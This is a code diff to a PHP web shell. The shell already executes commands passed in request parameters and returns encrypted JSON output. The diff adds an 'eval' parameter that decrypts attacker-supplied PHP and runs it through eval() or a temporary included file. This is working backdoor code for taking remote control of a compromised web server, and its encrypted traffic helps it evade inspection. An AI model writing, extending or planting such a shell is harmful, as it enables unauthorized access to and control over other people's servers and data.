@@ -107,11 +107,15 @@ function is_function_available($function)
 }
 function output_json($output = '')
 {
-    $output_data = array(
-        'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
-        'banner' => get_shell_prefix(),
-        'stdout' => $output
-    );
+    if (is_array($output)) {
+        $output_data = $output;
+    } else {
+        $output_data = array(
+            'pwd' => empty($_SESSION['pwd']) ? getcwd() : $_SESSION['pwd'],
+            'banner' => get_shell_prefix(),
+            'stdout' => $output
+        );
+    }
     if (is_callable('json_encode')) {
         header('Content-Type: text/plain;');
         echo encrypt(json_encode($output_data));
@@ -187,6 +191,46 @@ function get_user()
     }
     return getenv('USERNAME') ? getenv('USERNAME') : getenv('USER');
 }
+function simple_eval($code)
+{
+    ob_start();
+    @eval($code);
+    $output = ob_get_contents();
+    ob_get_clean();
+    return $output;
+}
+function better_eval($code)
+{
+    $temp = tmpfile();
+    $file = stream_get_meta_data($temp);
+    $file = $file['uri'];
+    fwrite($temp, $code);
+    ob_start();
+    include($file);
+    $output = ob_get_contents();
+    ob_get_clean();
+    fclose($temp);
+    if (file_exists($file)) {
+        unlink($file);
+    }
+    return $output;
+}
+function do_eval($code, $mech = 'auto')
+{
+    switch ($mech) {
+        case 'auto':
+            if (@eval('return true;')) {
+                return do_eval($code, 'eval');
+            }
+            return do_eval($code, 'tempfile');
+        case 'eval':
+            return simple_eval($code);
+
+        case 'tempfile':
+            return better_eval($code);
+    }
+    return false;
+}
 
 /**
  * CORE
@@ -232,4 +276,19 @@ if (isset($_REQUEST['cmd'])) {
 
     $output = execute_command($REQUESTED_CMD);
     output_json($output);
+}
+
+/**
+ * PHP Eval
+ */
+if (isset($_REQUEST['eval'])) {
+    $mech = $_REQUEST['mechanism'] ? $_REQUEST['mechanism'] : 'auto';
+    $code = decrypt($_REQUEST['eval']);
+    $t1 = microtime(true);
+    $output = do_eval($code, $mech);
+    $t2 = microtime(true);
+    output_json(array(
+        'stdout' => $output,
+        'took' => round($t2 - $t1, 2),
+    ));
 }
